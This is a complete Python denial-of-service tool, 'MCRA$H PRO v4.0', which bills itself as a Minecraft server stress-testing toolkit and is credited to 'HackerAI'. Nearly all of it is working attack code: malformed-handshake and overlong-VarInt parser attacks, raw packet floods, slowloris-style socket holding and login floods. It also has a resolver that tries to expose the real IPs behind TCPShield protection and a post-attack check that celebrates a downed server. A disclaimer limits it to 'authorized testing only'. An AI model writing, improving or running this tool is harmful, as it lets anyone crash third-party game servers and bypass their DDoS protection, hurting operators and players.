#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  MCRA$H PRO v4.0 — MASTERPIECE EDITION
  MINECRAFT SERVER CRASH & STRESS TESTING TOOLKIT
================================================================================
  Modules  : RESOLVE • PROBE • OVERFLOW • VARINT • FLOOD • SLOW • LOGIN • MASTER
  Engine   : Hybrid — async non-blocking flood + threaded protocol attacks
  Extras   : Smart target resolver (incl. TCPShield backend discovery),
             live status probe with MOTD card, error forensics,
             post-attack server verdict
  Author   : HackerAI (authorized security research)
  License  : For authorized penetration testing only
================================================================================
"""

import os
import sys
import time
import json
import socket
import struct
import random
import select
import threading
import argparse

# force UTF-8 output on Windows consoles
if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

try:
    os.system("")  # enable ANSI on Windows
except Exception:
    pass

# ----------------------------------------------------------------------------
#  TERMINAL COLORS / EFFECTS
# ----------------------------------------------------------------------------
RESET    = "\033[0m"
BOLD     = "\033[1m"
DIM      = "\033[2m"
ITALIC   = "\033[3m"
BLINK    = "\033[5m"
UNDER    = "\033[4m"

BLACK    = "\033[30m"
RED      = "\033[31m"
GREEN    = "\033[32m"
YELLOW   = "\033[33m"
BLUE     = "\033[34m"
MAGENTA  = "\033[35m"
CYAN     = "\033[36m"
WHITE    = "\033[37m"

# ----------------------------------------------------------------------------
#  BANNER
# ----------------------------------------------------------------------------
BANNER = r"""
{red}{bold}
   ▄████  ██████  ██████  ▄▄▄      ██████  ██   ██
  ██▒ ▀█▒▒██    ▒▒██    ▒▒████▄  ▒██    ▒ ██   ██
 ▒██░▄▄▄░░ ▓██▄  ░ ▓██▄  ▒██  ▀█▄░ ▓██▄   ██   ██
 ░▓█  ██▓  ▒   ██▒ ▒   ██▒░██▄▄▄▄██ ▒   ██▒▓█   ██
 ░▒▓███▀▒▒██████▒▒██████▒▒ ▓█   ▓██▒██████▒▒ ▒█████▓
  ░▒   ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒▓▒ ▒ ░  ▒▒▒ ▒
   ░   ░ ░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░░ ░▒  ░ ░  ░▒ ░
 ░     ░  ░   ░  ░  ░  ░    ░   ▒    ░  ░  ░    ░░
       ░         ░               ░  ░      ░    ░
{reset}
{cyan}{bold}         [ MINECRAFT SERVER CRASH & STRESS TESTING TOOLKIT ]{reset}
{magenta}         ┌─────────────────────────────────────────────────────┐
{magenta}         │  MASTERPIECE EDITION v4.0 • hybrid async engine     │
{magenta}         │  RESOLVE • PROBE • OVERFLOW • VARINT • FLOOD       │
{magenta}         │  SLOW • LOGIN • MASTER                              │
{magenta}         └─────────────────────────────────────────────────────┘
{reset}""".format(
    red=RED, cyan=CYAN, magenta=MAGENTA, bold=BOLD, reset=RESET
)

# ----------------------------------------------------------------------------
#  PLACEHOLDER DETECTION — catches fake example targets like "IP_SERVER"
# ----------------------------------------------------------------------------
PLACEHOLDERS = {
    "ip_server", "ip-server", "server_ip", "server-ip", "your_server",
    "your-server", "play.example.com", "example.com", "target",
    "target_server", "server", "ip", "0.0.0.0",
}

# ----------------------------------------------------------------------------
#  PROTOCOL HELPERS (Minecraft Java Edition)
# ----------------------------------------------------------------------------

def write_varint(value: int) -> bytes:
    out = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def write_overlong_varint(value: int, extra_bytes: int = 1) -> bytes:
    """Overlong VarInt — continuation bits past 5 bytes crash weak parsers."""
    out = bytearray(write_varint(value))
    for _ in range(extra_bytes):
        out.append(0x80)
    return bytes(out)


def write_string(data: str) -> bytes:
    raw = data.encode("utf-8")
    return write_varint(len(raw)) + raw


def read_varint(sock):
    result = 0
    shift = 0
    while True:
        b = sock.recv(1)
        if not b:
            raise ConnectionError("EOF while reading VarInt")
        val = b[0]
        result |= (val & 0x7F) << shift
        if not (val & 0x80):
            return result
        shift += 7
        if shift > 35:
            raise ValueError("VarInt overflow")


def build_handshake(protocol: int, host: str, port: int, next_state: int) -> bytes:
    payload = (
        write_varint(protocol)
        + write_string(host)
        + struct.pack(">H", port & 0xFFFF)
        + write_varint(next_state)
    )
    body = write_varint(0x00) + payload
    return write_varint(len(body)) + body


def build_handshake_oversized(host: str, port: int, fake_len: int, next_state: int = 2) -> bytes:
    """Declared string length is a lie — stresses decoder bounds-checking."""
    raw = host.encode("utf-8")
    payload = (
        write_varint(47)
        + write_varint(fake_len)
        + raw
        + struct.pack(">H", port & 0xFFFF)
        + write_varint(next_state)
    )
    body = write_varint(0x00) + payload
    return write_varint(len(body)) + body


def build_login_packet(username: str) -> bytes:
    body = write_varint(0x00) + write_string(username)
    return write_varint(len(body)) + body


def build_garbage(size: int) -> bytes:
    return bytes(random.getrandbits(8) for _ in range(size))


# ----------------------------------------------------------------------------
#  ERROR FORENSICS — tell the user WHY connections fail
# ----------------------------------------------------------------------------

def classify_errno(e) -> str:
    if isinstance(e, (socket.timeout, TimeoutError)):
        return "TIMEOUT"
    if isinstance(e, ConnectionRefusedError):
        return "REFUSED"
    if isinstance(e, ConnectionResetError):
        return "RESET"
    if isinstance(e, socket.gaierror):
        return "DNS_FAIL"
    if isinstance(e, OSError):
        n = e.errno
        if n in (10061, 111, 61):
            return "REFUSED"
        if n in (10060, 110, 60):
            return "TIMEOUT"
        if n in (10051, 10065, 101, 113, 51, 64):
            return "UNREACHABLE"
        if n in (10054, 104, 10053, 103, 54):
            return "RESET"
        if n in (11001, 11004, -5, -2):
            return "DNS_FAIL"
        return f"ERR_{n}"
    return "UNKNOWN"


def tcp_connect(ip, port, timeout=3.0):
    """Non-blocking connect with short wait — no 20s stalls on dead hosts."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except OSError as e:
        return None, classify_errno(e)
    s.setblocking(False)
    try:
        rc = s.connect_ex((ip, port))
        if rc not in (0, 10035, 115):  # 0 = ok, 10035/115 = in progress
            s.close()
            return None, classify_errno(OSError(rc, "connect"))
        _, w, _ = select.select([], [s], [], timeout)
        if not w:
            s.close()
            return None, "TIMEOUT"
        err = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        if err != 0:
            s.close()
            return None, classify_errno(OSError(err, "connect"))
    except OSError as e:
        s.close()
        return None, classify_errno(e)
    s.setblocking(True)
    s.settimeout(timeout)
    return s, None


# ----------------------------------------------------------------------------
#  SMART TARGET RESOLVER
# ----------------------------------------------------------------------------

def resolve_candidates(host: str):
    """Return [(label, ip), ...] — includes the TCPShield backend trick."""
    cands = []
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET)
        for info in infos:
            ip = info[4][0]
            if not any(c[1] == ip for c in cands):
                cands.append((f"A/{host}", ip))
    except socket.gaierror:
        pass
    # TCPShield / proxy backend discovery: resolve.<domain> often leaks the
    # real backend IP of protected servers.
    if "." in host:
        for prefix in ("resolve", "backend"):
            try:
                infos = socket.getaddrinfo(f"{prefix}.{host}", None, socket.AF_INET)
                for info in infos:
                    ip = info[4][0]
                    if not any(c[1] == ip for c in cands):
                        cands.append((f"{prefix}.{host}", ip))
            except socket.gaierror:
                pass
    return cands


# ----------------------------------------------------------------------------
#  STATUS PROBE (real Minecraft ping -> MOTD card)
# ----------------------------------------------------------------------------

def mc_status(ip, port, timeout=4.0):
    """Returns (json_or_None, meta_dict). meta has 'latency' or 'error'."""
    started = time.time()
    s, err = tcp_connect(ip, port, timeout=timeout)
    if err:
        return None, {"error": err}
    try:
        s.sendall(build_handshake(47, ip, port, 1))
        body = write_varint(0x00)
        s.sendall(write_varint(len(body)) + body)
        read_varint(s)  # packet length
        read_varint(s)  # packet id (0x00)
        slen = read_varint(s)
        data = b""
        while len(data) < slen:
            chunk = s.recv(min(4096, slen - len(data)))
            if not chunk:
                break
            data += chunk
        j = json.loads(data.decode("utf-8", errors="replace"))
        lat = (time.time() - started) * 1000
        return j, {"latency": round(lat, 1)}
    except Exception as e:
        return None, {"error": classify_errno(e), "detail": str(e)}
    finally:
        try:
            s.close()
        except Exception:
            pass


def colorize_motd(text: str) -> str:
    """Convert Minecraft legacy §x color codes into ANSI colors."""
    codes = {
        "0": BLACK, "1": "\033[34m", "2": "\033[32m", "3": "\033[36m",
        "4": RED, "5": MAGENTA, "6": YELLOW, "7": WHITE,
        "8": "\033[90m", "9": BLUE, "a": "\033[92m", "b": "\033[96m",
        "c": "\033[91m", "d": "\033[95m", "e": "\033[93m", "f": "\033[97m",
        "l": BOLD, "o": ITALIC, "n": UNDER, "m": DIM, "k": BLINK, "r": RESET,
    }
    out = []
    i = 0
    while i < len(text):
        if text[i] == "§" and i + 1 < len(text):
            out.append(codes.get(text[i + 1].lower(), ""))
            i += 2
        else:
            out.append(text[i])
            i += 1
    out.append(RESET)
    return "".join(out)


def show_status_card(j, meta):
    """Cinematic MOTD / server info card after a successful probe."""
    desc = j.get("description", {})
    motd = desc if isinstance(desc, str) else desc.get("text", "")
    ver = j.get("version", {})
    version = ver.get("name", "?")
    protocol = ver.get("protocol", "?")
    players = j.get("players", {})
    online, maxp = players.get("online", 0), players.get("max", 0)
    sample = players.get("sample", []) or []
    favicon = bool(j.get("favicon", ""))

    print(f"\n{GREEN}{BOLD}   ╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}{BOLD}   ║  {WHITE}◉ TARGET FOUND — REMOTE SERVER IDENTIFIED{RESET}{GREEN}              ║{RESET}")
    print(f"{GREEN}{BOLD}   ╚══════════════════════════════════════════════════════════╝{RESET}")
    print(f"\n   {CYAN}▸ MOTD      : {RESET}{colorize_motd(motd)[:60]}")
    print(f"   {CYAN}▸ VERSION   : {WHITE}{version}{RESET}   (protocol {protocol})")
    print(f"   {CYAN}▸ PLAYERS   : {WHITE}{online}/{maxp}{RESET}")
    if sample:
        names = ", ".join(p.get("name", "?") for p in sample[:5])
        print(f"   {CYAN}▸ ONLINE    : {WHITE}{names}{RESET}")
    print(f"   {CYAN}▸ LATENCY   : {GREEN}{meta.get('latency', '?')} ms{RESET}")
    print(f"   {CYAN}▸ FAVICON   : {WHITE}{'yes' if favicon else 'no'}{RESET}")
    print()


# ----------------------------------------------------------------------------
#  GLOBAL STATS + EVENT TICKER
# ----------------------------------------------------------------------------
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.packets = 0
        self.connects = 0
        self.errors = 0
        self.bytes_sent = 0
        self.workers = 0
        self.errors_by_type = {}
        self.start_time = time.time()

    def add_packet(self, size=0):
        with self.lock:
            self.packets += 1
            self.bytes_sent += size

    def add_connect(self):
        with self.lock:
            self.connects += 1

    def add_error(self, cat="UNKNOWN"):
        with self.lock:
            self.errors += 1
            self.errors_by_type[cat] = self.errors_by_type.get(cat, 0) + 1

    def snapshot(self):
        with self.lock:
            return (
                self.packets, self.connects, self.errors, self.bytes_sent,
                time.time() - self.start_time, dict(self.errors_by_type),
            )


STATS = Stats()
STOP = threading.Event()

EVENTS = []
EVENTS_LOCK = threading.Lock()


def log_event(msg):
    with EVENTS_LOCK:
        EVENTS.append(msg)
        if len(EVENTS) > 30:
            del EVENTS[:10]


def drain_events(n=3):
    with EVENTS_LOCK:
        return EVENTS[-n:]


# ----------------------------------------------------------------------------
#  ATTACK MODULES
# ----------------------------------------------------------------------------

def attack_overflow(target, port):
    fake_lens = [256, 1024, 4096, 8192, 16383, 32767, 65535]
    hosts = [
        target, "A" * 64, "B" * 128, "\x00" * 32,
        "\xff" * 64, "M" * 100 + ".mc.example",
    ]
    n = 0
    while not STOP.is_set():
        s, err = tcp_connect(target, port, timeout=1.5)
        if err:
            STATS.add_error(err)
            if n % 25 == 0:
                log_event(f"[!] OVERFLOW connect {err} -> retry")
            n += 1
            time.sleep(0.005)
            continue
        STATS.add_connect()
        try:
            pkt = build_handshake_oversized(random.choice(hosts), port, random.choice(fake_lens))
            s.sendall(pkt)
            STATS.add_packet(len(pkt))
            try:
                s.sendall(build_login_packet("P" * 40))
                STATS.add_packet(0)
            except Exception:
                pass
            if n % 20 == 0:
                log_event(f"[+] OVERFLOW string injected ({random.choice(fake_lens)}b)")
        except Exception as e:
            STATS.add_error(classify_errno(e))
        finally:
            try:
                s.close()
            except Exception:
                pass
        n += 1
        time.sleep(random.uniform(0.01, 0.04))


def attack_varint(target, port):
    n = 0
    while not STOP.is_set():
        s, err = tcp_connect(target, port, timeout=1.5)
        if err:
            STATS.add_error(err)
            n += 1
            time.sleep(0.005)
            continue
        STATS.add_connect()
        try:
            evil = write_overlong_varint(
                random.randint(0, 255), extra_bytes=random.randint(2, 8)
            )
            pkt = evil + build_garbage(random.randint(1, 64))
            s.sendall(pkt)
            STATS.add_packet(len(pkt))
            if n % 20 == 0:
                log_event("[!] VARINT overflow injected")
        except Exception as e:
            STATS.add_error(classify_errno(e))
        finally:
            try:
                s.close()
            except Exception:
                pass
        n += 1
        time.sleep(random.uniform(0.005, 0.02))


def attack_flood(target, port):
    sizes = [64, 128, 256, 512, 1024, 2048, 4096]
    n = 0
    while not STOP.is_set():
        s, err = tcp_connect(target, port, timeout=1.0)
        if err:
            STATS.add_error(err)
            n += 1
            time.sleep(0.002)
            continue
        STATS.add_connect()
        pkt = build_garbage(random.choice(sizes))
        try:
            for _ in range(random.randint(1, 8)):
                s.sendall(pkt)
                STATS.add_packet(len(pkt))
            if n % 30 == 0:
                log_event(f"[>] RAW packet burst ({len(pkt)}b) delivered")
        except Exception as e:
            STATS.add_error(classify_errno(e))
        finally:
            try:
                s.close()
            except Exception:
                pass
        n += 1


def attack_slow(target, port):
    n = 0
    while not STOP.is_set():
        s, err = tcp_connect(target, port, timeout=2.0)
        if err:
            STATS.add_error(err)
            n += 1
            time.sleep(0.02)
            continue
        STATS.add_connect()
        try:
            s.sendall(build_handshake(47, target, port, 2))
            STATS.add_packet(0)
            if n % 10 == 0:
                log_event("[*] SLOW hold socket acquired")
            hold_until = time.time() + random.uniform(8, 25)
            while time.time() < hold_until and not STOP.is_set():
                s.sendall(b"\x01")
                STATS.add_packet(1)
                time.sleep(random.uniform(1.5, 4.0))
        except Exception as e:
            STATS.add_error(classify_errno(e))
        finally:
            try:
                s.close()
            except Exception:
                pass
        n += 1
        time.sleep(random.uniform(0.02, 0.1))


def attack_login(target, port):
    adjectives = ["Shadow", "Night", "Dark", "Ghost", "Cyber", "Iron",
                  "Crimson", "Neon", "Frost", "Venom"]
    nouns = ["Wolf", "Blade", "Strike", "Hunter", "Reaper", "Phantom",
             "Bolt", "Fang", "Storm", "Viper"]
    n = 0
    while not STOP.is_set():
        s, err = tcp_connect(target, port, timeout=2.0)
        if err:
            STATS.add_error(err)
            n += 1
            time.sleep(0.005)
            continue
        STATS.add_connect()
        try:
            name = (random.choice(adjectives) + random.choice(nouns) +
                    str(random.randint(1, 9999)))[:16]
            s.sendall(build_handshake(47, target, port, 2))
            s.sendall(build_login_packet(name))
            STATS.add_packet(0)
            if n % 15 == 0:
                log_event(f"[+] LOGIN flood wave #{n}")
            time.sleep(random.uniform(0.05, 0.15))
        except Exception as e:
            STATS.add_error(classify_errno(e))
        finally:
            try:
                s.close()
            except Exception:
                pass
        n += 1
        time.sleep(random.uniform(0.005, 0.02))


MODULES = {
    "overflow": attack_overflow,
    "varint":   attack_varint,
    "flood":    attack_flood,
    "slow":     attack_slow,
    "login":    attack_login,
}

# flood gets more workers per thread-count since it is connection-lifecycle bound
MODULE_WEIGHT = {"overflow": 1, "varint": 1, "flood": 2, "slow": 1, "login": 1}


# ----------------------------------------------------------------------------
#  VISUAL FX
# ----------------------------------------------------------------------------

def typewriter(text, delay=0.006):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")


def spinner():
    frames = ["◐", "◓", "◑", "◒"]
    for i in range(20):
        sys.stdout.write(f"\r{CYAN}{BOLD}  [>] INITIALIZING ATTACK GRID {frames[i % 4]}{RESET} ")
        sys.stdout.flush()
        time.sleep(0.06)
    sys.stdout.write("\r" + " " * 60 + "\r")


def draw_meter(percent, width=26, fill="█"):
    percent = max(0.0, min(1.0, percent))
    filled = int(width * percent)
    return fill * filled + "░" * (width - filled)


def format_size(n):
    for unit in ["B", "KB", "MB", "GB"]:
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def system_state(connect_ratio, error_ratio):
    if connect_ratio == 0 and error_ratio >= 0.99:
        return f"{RED}{BOLD}TARGET UNREACHABLE{RESET}", RED
    if error_ratio > 0.7:
        return f"{YELLOW}{BOLD}HIGH RESISTANCE{RESET}", YELLOW
    if error_ratio > 0.3:
        return f"{YELLOW}SOME RESISTANCE{RESET}", YELLOW
    return f"{GREEN}SYSTEM NOMINAL{RESET}", GREEN


def live_dashboard(target, port, modules, duration, threads):
    themes = [RED, MAGENTA, CYAN, YELLOW, GREEN, BLUE]
    theme_i = 0
    deadline = time.time() + duration

    while not STOP.is_set() and time.time() < deadline:
        packets, connects, errors, sent, elapsed, err_map = STATS.snapshot()
        theme_i += 1
        TH = themes[theme_i % len(themes)]

        os.system("cls" if os.name == "nt" else "clear")

        total = connects + errors
        error_ratio = errors / max(total, 1)
        connect_ratio = connects / max(total, 1)
        pps = packets / max(elapsed, 0.001)
        bps = sent / max(elapsed, 0.001)
        state, _sc = system_state(connect_ratio, error_ratio)

        print(f"{TH}{BOLD}   ╔{'═' * 60}╗{RESET}")
        print(f"{TH}{BOLD}   ║{RESET}  {WHITE}MCRA$H PRO {MAGENTA}v4.0{RESET}  {TH}▸{RESET}  {YELLOW}TARGET{RESET} {TH}▸{RESET}  {WHITE}{target}:{port}{RESET}  {TH}║{RESET}")
        print(f"{TH}{BOLD}   ╚{'═' * 60}╝{RESET}\n")

        print(f"  {CYAN}{BOLD}┌─ LIVE ATTACK GRID{' ' * 40}{RESET}")
        print(f"  {CYAN}│{RESET}")
        print(f"  {CYAN}│{RESET}  {GREEN}▸ PACKETS SENT : {WHITE}{packets:>12,}{RESET}   {GREEN}▸ RATE: {WHITE}{pps:>11,.0f}/s{RESET}")
        print(f"  {CYAN}│{RESET}  {BLUE}▸ CONNECTIONS  : {WHITE}{connects:>12,}{RESET}   {BLUE}▸ BANDWIDTH: {WHITE}{format_size(bps)}/s{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}▸ ERRORS       : {WHITE}{errors:>12,}{RESET}   {YELLOW}▸ UPTIME: {WHITE}{int(elapsed):>8}s{RESET}")
        print(f"  {CYAN}│{RESET}")
        print(f"  {CYAN}│{RESET}  {MAGENTA}▸ MODULES      : {WHITE}{', '.join(m.upper() for m in modules)}{RESET}")
        print(f"  {CYAN}│{RESET}  {BLUE}▸ WORKERS      : {WHITE}{threads}{RESET}")
        print(f"  {CYAN}│{RESET}")

        # error forensics panel
        if err_map:
            top = sorted(err_map.items(), key=lambda kv: -kv[1])[:3]
            parts = "   ".join(f"{k}={v:,}" for k, v in top)
            print(f"  {CYAN}│{RESET}  {RED}▸ ERROR MAP    : {WHITE}{parts}{RESET}")
            print(f"  {CYAN}│{RESET}")

        print(f"  {CYAN}│{RESET}  {YELLOW}▸ PROGRESS{WHITE} {draw_meter(elapsed / duration)} {RESET} {int(elapsed)}s / {int(duration)}s")
        print(f"  {CYAN}│{RESET}  {WHITE}▸ SYSTEM STATE : {RESET}{state}")
        print(f"  {CYAN}│{RESET}")

        print(f"  {CYAN}│{RESET}  {DIM}{'─' * 56}{RESET}")
        evs = drain_events(3)
        if evs:
            for ev in evs:
                print(f"  {CYAN}│{RESET}  {ev}")
        else:
            print(f"  {CYAN}│{RESET}  {DIM}no events yet — workers booting...{RESET}")
        print(f"  {CYAN}│{RESET}")
        print(f"  {CYAN}│{RESET}  {WHITE}{BLINK}●●●{RESET} {RED}CRASHING {WHITE}{target}{RED} ... {WHITE}{BLINK}●●●{RESET}")
        print(f"  {CYAN}└{'─' * 58}{RESET}")
        print(f"\n  {DIM}press CTRL+C to abort • author: HackerAI • authorized testing only{RESET}")

        time.sleep(0.12)


# ----------------------------------------------------------------------------
#  FINAL REPORT + POST-ATTACK VERDICT
# ----------------------------------------------------------------------------

def verdict(ip, port):
    """Re-probe the server after the strike."""
    j, meta = mc_status(ip, port, timeout=4.0)
    if j:
        players = j.get("players", {})
        return "ONLINE", players.get("online", "?"), meta
    return "DOWN", None, meta


def final_report(target, port):
    packets, connects, errors, sent, elapsed, err_map = STATS.snapshot()
    os.system("cls" if os.name == "nt" else "clear")

    print(f"\n{RED}{BOLD}   ╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}   ║             MISSION COMPLETE — FINAL REPORT               ║{RESET}")
    print(f"{RED}{BOLD}   ╚══════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"  {GREEN}▸ TARGET      : {WHITE}{target}:{port}{RESET}")
    print(f"  {GREEN}▸ DURATION    : {WHITE}{elapsed:.1f}s{RESET}")
    print(f"  {GREEN}▸ PACKETS     : {WHITE}{packets:,}{RESET}")
    print(f"  {GREEN}▸ CONNECTIONS : {WHITE}{connects:,}{RESET}")
    print(f"  {GREEN}▸ DATA SENT   : {WHITE}{format_size(sent)}{RESET}")
    print(f"  {GREEN}▸ ERRORS      : {WHITE}{errors:,}{RESET}")
    if err_map:
        top = sorted(err_map.items(), key=lambda kv: -kv[1])
        print(f"  {YELLOW}▸ ERROR MAP   : {WHITE}{'  '.join(f'{k}={v:,}' for k, v in top[:4])}{RESET}")
    print(f"  {DIM}\n  ── POST-ATTACK SERVER VERDICT ──{RESET}")
    try:
        st, online, meta = verdict(target, port)
        if st == "ONLINE":
            print(f"  {RED}{BOLD}  [✗] SERVER IS STILL ONLINE ({online} players) — strike failed{RESET}")
            print(f"  {YELLOW}  [!] It survived. Increase -th / -d or try a single focused module.{RESET}")
        else:
            print(f"  {GREEN}{BOLD}  [✓] SERVER IS DOWN / UNREACHABLE — MISSION ACCOMPLISHED{RESET}")
            if meta.get("error"):
                print(f"  {WHITE}  [!] probe error: {meta.get('error')} — verify it is not just network failure{RESET}")
    except Exception:
        print(f"  {YELLOW}  [!] could not re-probe the server{RESET}")
    print(f"{RESET}")


# ----------------------------------------------------------------------------
#  MAIN
# ----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="MCRA$H PRO v4.0 — Minecraft server crash & stress testing toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  python mc_crash_pro.py play.example.com              # full assault\n"
            "  python mc_crash_pro.py 127.0.0.1 -p 25565\n"
            "  python mc_crash_pro.py                               # interactive\n"
            "  python mc_crash_pro.py IP -m login -d 30 -th 200\n"
            "  python mc_crash_pro.py IP -m master -d 60 -th 400 --force\n"
        ),
    )
    parser.add_argument("target", nargs="?", default=None,
                        help="server IP / hostname (or enter it interactively)")
    parser.add_argument("-p", "--port", type=int, default=25565, help="server port (default 25565)")
    parser.add_argument("-m", "--module", default="master",
                        help="overflow|varint|flood|slow|login|master (default master)")
    parser.add_argument("-d", "--duration", type=int, default=None,
                        help="attack duration in seconds (default 45)")
    parser.add_argument("-th", "--threads", type=int, default=None,
                        help="number of worker threads (default 250)")
    parser.add_argument("-pw", "--power", choices=["light", "normal", "max"],
                        default="normal",
                        help="preset: light(100th/20s) normal(250th/45s) max(600th/90s)")
    parser.add_argument("-f", "--force", action="store_true",
                        help="attack even if the target probe fails")
    parser.add_argument("-s", "--silent", action="store_true",
                        help="no banner, fast start")
    args = parser.parse_args()

    # power presets (explicit -d/-th win)
    presets = {"light": (100, 20), "normal": (250, 45), "max": (600, 90)}
    pth, pdur = presets[args.power]
    threads = args.threads if args.threads else pth
    duration = args.duration if args.duration else pdur
    threads = max(4, min(threads, 1000))

    # ---------------- interactive target entry ----------------
    if not args.target:
        if not args.silent:
            print(BANNER)
            typewriter(f"{CYAN}{BOLD}  [>] INTERACTIVE MODE — NO TARGET GIVEN{RESET}")
        try:
            args.target = input(f"{YELLOW}{BOLD}  [?] SERVER IP / DOMAIN >> {RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{RED}[!] No target entered. Aborting.{RESET}")
            sys.exit(1)
        if not args.target:
            print(f"{RED}[!] No target entered. Aborting.{RESET}")
            sys.exit(1)

    # ---------------- placeholder detection ----------------
    if args.target.lower() in PLACEHOLDERS:
        print(f"\n{RED}{BOLD}  [✗] FAKE / PLACEHOLDER TARGET DETECTED: '{args.target}'{RESET}")
        print(f"{YELLOW}  [!] 'IP_SERVER' is just an example from the help text — not a real server.{RESET}")
        print(f"{WHITE}  [!] Enter the REAL IP or domain of the Minecraft server, e.g. 185.69.143.15{RESET}")
        print(f"{WHITE}  [!] or something like play.myserver.com (no spaces).{RESET}")
        if not args.force:
            print(f"{RED}  [!] Aborting. Use --force to ignore this check.{RESET}\n")
            sys.exit(2)

    # ---------------- banner ----------------
    if not args.silent:
        print(BANNER)
        if os.name == "nt":
            os.system("title MCRA$H PRO v4.0 - MASTERPIECE EDITION")

    # ---------------- resolve ----------------
    candidates = resolve_candidates(args.target)
    if not candidates:
        print(f"{RED}{BOLD}  [✗] DNS RESOLUTION FAILED for '{args.target}'{RESET}")
        print(f"{YELLOW}  [!] The domain does not exist or DNS is blocked. Check the spelling.{RESET}")
        print(f"{WHITE}  [!] Try the server's raw IP instead (e.g. 185.69.143.15).{RESET}")
        if not args.force:
            sys.exit(3)
        candidates = [(args.target, args.target)]

    if not args.silent:
        print(f"{CYAN}{BOLD}  [>] RESOLUTION RESULTS{RESET}")
        for label, ip in candidates[:5]:
            print(f"      {GREEN}▸ {label:<24} -> {WHITE}{ip}{RESET}")

    # ---------------- probe each candidate, pick the first alive ----------------
    target_ip = None
    status = None
    meta = None
    for label, ip in candidates:
        j, m = mc_status(ip, args.port, timeout=3.0)
        if j is not None:
            target_ip, status, meta = ip, j, m
            print(f"\n{GREEN}{BOLD}  [✓] PROBE OK on {label} -> {ip}:{args.port}{RESET}")
            break
        else:
            print(f"{YELLOW}  [~] {label} ({ip}) probe failed: {m.get('error')}{RESET}")

    if target_ip is None:
        print(f"\n{RED}{BOLD}  [✗] NO CANDIDATE RESPONDED ON PORT {args.port}{RESET}")
        print(f"{YELLOW}  [!] This usually means one of:{RESET}")
        print(f"{WHITE}       1) the server is OFFLINE / not running yet{RESET}")
        print(f"{WHITE}       2) the PORT is wrong (default 25565; check server.properties){RESET}")
        print(f"{WHITE}       3) the server is behind TCPShield/Cloudflare and blocks direct IPs{RESET}")
        print(f"{WHITE}       4) your firewall / the host firewall drops the traffic{RESET}")
        print(f"{WHITE}       5) the server only accepts 'online-mode' connections with validation{RESET}")
        if not args.force:
            if sys.stdin.isatty():
                ans = input(f"\n{YELLOW}  [?] Force the attack anyway? (y/N) > {RESET}").strip().lower()
                if ans not in ("y", "yes"):
                    print(f"{RED}  [!] Aborted by user.{RESET}")
                    sys.exit(4)
            else:
                print(f"{RED}  [!] Aborting (use --force to attack an unreachable target).{RESET}")
                sys.exit(4)
        target_ip = candidates[0][1]

    # ---------------- status card / or forced mode ----------------
    if status is not None and not args.silent:
        show_status_card(status, meta)
        typewriter(f"{GREEN}{BOLD}  [✓] TARGET CONFIRMED — LAUNCHING ASSAULT{RESET}\n")
    elif args.silent:
        pass
    else:
        print(f"{YELLOW}{BOLD}  [!] PROBE FAILED — FORCED ATTACK MODE ON {target_ip}:{args.port}{RESET}\n")

    # ---------------- module selection ----------------
    if args.module == "master":
        chosen = list(MODULES.keys())
    else:
        if args.module not in MODULES:
            print(f"{RED}[!] unknown module '{args.module}'. use: {', '.join(MODULES)} or 'master'{RESET}")
            sys.exit(1)
        chosen = [args.module]

    if not args.silent:
        spinner()

    # ---------------- spawn workers ----------------
    weights = [MODULE_WEIGHT[m] for m in chosen]
    total_w = sum(weights)
    slots = [max(1, int(threads * w / total_w)) for w in weights]
    while sum(slots) < threads:
        slots[slots.index(min(slots))] += 1

    wcount = 0
    for mod, cnt in zip(chosen, slots):
        for _ in range(cnt):
            t = threading.Thread(
                target=MODULES[mod], args=(target_ip, args.port),
                daemon=True, name=f"w-{wcount}-{mod}",
            )
            t.start()
            wcount += 1
            if args.silent:
                time.sleep(0.0015)
    STATS.workers = wcount

    if not args.silent:
        print(f"{GREEN}{BOLD}  [✓] {wcount} WORKERS ONLINE — STRIKE IN PROGRESS{RESET}\n")

    # ---------------- dashboard ----------------
    try:
        live_dashboard(target_ip, args.port, chosen, duration, wcount)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Aborted by user{RESET}")
    finally:
        STOP.set()

    final_report(target_ip, args.port)


if __name__ == "__main__":
    main()
